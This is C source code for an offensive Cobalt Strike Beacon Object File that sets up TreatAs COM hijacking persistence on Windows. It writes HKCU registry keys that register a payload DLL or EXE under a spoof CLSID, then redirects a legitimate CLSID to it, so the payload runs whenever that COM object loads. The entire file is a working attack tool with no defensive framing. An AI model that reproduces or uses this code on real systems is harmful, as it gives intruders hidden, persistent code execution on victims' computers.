#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"

// Server type mode flags
#define COMHUNTER_TREATAS_INPROCSERVER  0  // InprocServer32
#define COMHUNTER_TREATAS_LOCALSERVER   1  // LocalServer32

void BuildRegistryKey(const char* clsid, char* inprocPath, char* localPath, DWORD pathSize)
{
    MSVCRT$_snprintf(inprocPath, pathSize, "SOFTWARE\\Classes\\CLSID\\%s\\InprocServer32", clsid);
    MSVCRT$_snprintf(localPath, pathSize, "SOFTWARE\\Classes\\CLSID\\%s\\LocalServer32", clsid);
}

void BuildTreatAsKey(const char* clsid, char* treatAsPath, DWORD pathSize)
{
    MSVCRT$_snprintf(treatAsPath, pathSize, "SOFTWARE\\Classes\\CLSID\\%s\\TreatAs", clsid);
}

// Get file extension from path
const char* GetFileExtension(const char* filePath)
{
    const char* dot = NULL;
    const char* slash = NULL;
    const char* p = filePath;

    while (*p)
    {
        if (*p == '.')
            dot = p;
        else if (*p == '\\' || *p == '/')
            slash = p;
        p++;
    }

    if (dot != NULL && (slash == NULL || dot > slash))
    {
        return dot;
    }

    return NULL;
}

// Case-insensitive string comparison
int ComHunterStrCmpI(const char* s1, const char* s2)
{
    while (*s1 && *s2)
    {
        char c1 = *s1;
        char c2 = *s2;
        
        if (c1 >= 'A' && c1 <= 'Z') c1 += 32;
        if (c2 >= 'A' && c2 <= 'Z') c2 += 32;
        
        if (c1 != c2)
            return c1 - c2;
        
        s1++;
        s2++;
    }
    return *s1 - *s2;
}

// Check file extension
DWORD CheckExtension(const char* filePath, const char* serverType)
{
    const char* extension = GetFileExtension(filePath);

    if (extension == NULL)
    {
        internal_printf("[!] No file extension found in path: %s\n", filePath);
        return ERROR_INVALID_PARAMETER;
    }

    if (MSVCRT$strcmp(serverType, "InprocServer32") == 0)
    {
        if (ComHunterStrCmpI(extension, ".dll") != 0)
        {
            internal_printf("[!] Wrong file extension for InprocServer32. Expected .dll, got %s\n\n", extension);
            return ERROR_INVALID_PARAMETER;
        }
    }
    else if (MSVCRT$strcmp(serverType, "LocalServer32") == 0)
    {
        if (ComHunterStrCmpI(extension, ".exe") != 0)
        {
            internal_printf("[!] Wrong file extension for LocalServer32. Expected .exe, got %s\n\n", extension);
            return ERROR_INVALID_PARAMETER;
        }
    }
    else
    {
        internal_printf("[!] Invalid server type: %s\n\n", serverType);
        return ERROR_INVALID_PARAMETER;
    }

    return ERROR_SUCCESS;
}

// Create server registry key (InprocServer32 or LocalServer32)
DWORD CreateServerRegistryCU(const char* registryKey, const char* payload, const char* serverType)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    HKEY hKey = NULL;
    DWORD dwDisposition = 0;
    const char* threadingModel = "Both";

    dwErrorCode = ADVAPI32$RegCreateKeyExA(
        HKEY_CURRENT_USER,
        registryKey,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE | KEY_WOW64_64KEY,
        NULL,
        &hKey,
        &dwDisposition
    );

    if (dwErrorCode != ERROR_SUCCESS)
    {
        internal_printf("[!] Error creating server registry key: %lX\n", dwErrorCode);
        goto CreateServerRegistryCU_end;
    }

    // Set default value to payload path
    dwErrorCode = ADVAPI32$RegSetValueExA(
        hKey,
        NULL,
        0,
        REG_SZ,
        (const BYTE*)payload,
        MSVCRT$strlen(payload) + 1
    );

    if (dwErrorCode != ERROR_SUCCESS)
    {
        internal_printf("[!] Error setting default value: %lX\n", dwErrorCode);
        goto CreateServerRegistryCU_end;
    }

    // Set ThreadingModel to "Both" (only for InprocServer32)
    if (MSVCRT$strstr(registryKey, "InprocServer32") != NULL)
    {
        dwErrorCode = ADVAPI32$RegSetValueExA(
            hKey,
            "ThreadingModel",
            0,
            REG_SZ,
            (const BYTE*)threadingModel,
            MSVCRT$strlen(threadingModel) + 1
        );

        if (dwErrorCode != ERROR_SUCCESS)
        {
            internal_printf("[!] Error setting ThreadingModel: %lX\n", dwErrorCode);
            goto CreateServerRegistryCU_end;
        }
    }

    internal_printf("[+] %s Registry Key Created!\n", serverType);
    internal_printf("[+] Registry Key Path: Computer\\HKCU\\%s\n", registryKey);
    internal_printf("[+] Registry Key Value: %s\n", payload);
    if (MSVCRT$strstr(registryKey, "InprocServer32") != NULL)
    {
        internal_printf("[+] ThreadingModel: %s\n", threadingModel);
    }

CreateServerRegistryCU_end:
    if (hKey != NULL)
    {
        ADVAPI32$RegCloseKey(hKey);
    }

    return dwErrorCode;
}

// Create TreatAs registry key
DWORD CreateTreatAsRegistryCU(const char* registryKey, const char* spoofClsid)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    HKEY hKey = NULL;
    DWORD dwDisposition = 0;

    dwErrorCode = ADVAPI32$RegCreateKeyExA(
        HKEY_CURRENT_USER,
        registryKey,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE | KEY_WOW64_64KEY,
        NULL,
        &hKey,
        &dwDisposition
    );

    if (dwErrorCode != ERROR_SUCCESS)
    {
        internal_printf("[!] Error creating TreatAs registry key: %lX\n", dwErrorCode);
        goto CreateTreatAsRegistryCU_end;
    }

    // Set default value to spoof CLSID
    dwErrorCode = ADVAPI32$RegSetValueExA(
        hKey,
        NULL,
        0,
        REG_SZ,
        (const BYTE*)spoofClsid,
        MSVCRT$strlen(spoofClsid) + 1
    );

    if (dwErrorCode != ERROR_SUCCESS)
    {
        internal_printf("[!] Error setting TreatAs value: %lX\n", dwErrorCode);
        goto CreateTreatAsRegistryCU_end;
    }

    internal_printf("\n[+] TreatAs Registry Key Created!\n");
    internal_printf("[+] Registry Key Path: Computer\\HKCU\\%s\n", registryKey);
    internal_printf("[+] Registry Key Value: %s\n", spoofClsid);

CreateTreatAsRegistryCU_end:
    if (hKey != NULL)
    {
        ADVAPI32$RegCloseKey(hKey);
    }

    return dwErrorCode;
}

DWORD ComHunterTreatAs(const char* hijackClsid, const char* spoofClsid, const char* payload, int serverMode)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    char inprocPath[512] = {0};
    char localPath[512] = {0};
    char treatAsPath[512] = {0};
    const char* serverType = NULL;
    const char* registryKey = NULL;

    // Build registry keys for the spoof CLSID (where payload will be)
    BuildRegistryKey(spoofClsid, inprocPath, localPath, sizeof(inprocPath));
    
    // Build TreatAs key for the hijack CLSID
    BuildTreatAsKey(hijackClsid, treatAsPath, sizeof(treatAsPath));

    internal_printf("[*] Starting TreatAs Persist Mode...\n");
    internal_printf("[*] Hijack CLSID: %s\n", hijackClsid);
    internal_printf("[*] Spoof CLSID: %s\n", spoofClsid);
    internal_printf("[*] Payload: %s\n\n", payload);

    switch (serverMode)
    {
        case COMHUNTER_TREATAS_INPROCSERVER:
            serverType = "InprocServer32";
            registryKey = inprocPath;
            break;

        case COMHUNTER_TREATAS_LOCALSERVER:
            serverType = "LocalServer32";
            registryKey = localPath;
            break;

        default:
            internal_printf("[!] Invalid server mode: %d\n", serverMode);
            internal_printf("[*] Valid modes:\n");
            internal_printf("    0 = InprocServer32\n");
            internal_printf("    1 = LocalServer32\n");
            dwErrorCode = ERROR_INVALID_PARAMETER;
            goto ComHunterTreatAs_end;
    }

    // Check file extension
    dwErrorCode = CheckExtension(payload, serverType);
    if (dwErrorCode != ERROR_SUCCESS)
    {
        goto ComHunterTreatAs_end;
    }

    // Create server registry key with payload
    dwErrorCode = CreateServerRegistryCU(registryKey, payload, serverType);
    if (dwErrorCode != ERROR_SUCCESS)
    {
        goto ComHunterTreatAs_end;
    }

    // Create TreatAs registry key pointing to spoof CLSID
    dwErrorCode = CreateTreatAsRegistryCU(treatAsPath, spoofClsid);
    if (dwErrorCode != ERROR_SUCCESS)
    {
        goto ComHunterTreatAs_end;
    }

    internal_printf("\n[+] TreatAs COM Hijacking Persistence Established!\n");

ComHunterTreatAs_end:
    return dwErrorCode;
}

#ifdef BOF
VOID go( 
    IN PCHAR Buffer, 
    IN ULONG Length 
) 
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    datap parser = {0};
    const char* hijackClsid = NULL;
    const char* spoofClsid = NULL;
    const char* payload = NULL;
    int serverMode = 0;

    BeaconDataParse(&parser, Buffer, Length);
    hijackClsid = BeaconDataExtract(&parser, NULL);
    spoofClsid = BeaconDataExtract(&parser, NULL);
    payload = BeaconDataExtract(&parser, NULL);
    serverMode = BeaconDataInt(&parser);

    if(!bofstart())
    {
        return;
    }

    dwErrorCode = ComHunterTreatAs(hijackClsid, spoofClsid, payload, serverMode);
    if(ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ComHunterTreatAs failed: %lX\n", dwErrorCode);
        goto go_end;
    }

    internal_printf("\nSUCCESS.\n");

go_end:
    printoutput(TRUE);
    bofstop();
};
#else
int main(int argc, char** argv)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    const char* hijackClsid = "{00000000-0000-0000-0000-000000000000}";
    const char* spoofClsid = "{11111111-1111-1111-1111-111111111111}";
    const char* payload = "C:\\Windows\\Temp\\payload.dll";
    int serverMode = COMHUNTER_TREATAS_INPROCSERVER;

    if (argc >= 5)
    {
        hijackClsid = argv[1];
        spoofClsid = argv[2];
        payload = argv[3];
        serverMode = atoi(argv[4]);
    }

    dwErrorCode = ComHunterTreatAs(hijackClsid, spoofClsid, payload, serverMode);
    if(ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ComHunterTreatAs failed: %lX\n", dwErrorCode);
        goto main_end;
    }

    internal_printf("\nSUCCESS.\n");

main_end:
    return dwErrorCode;
}
#endif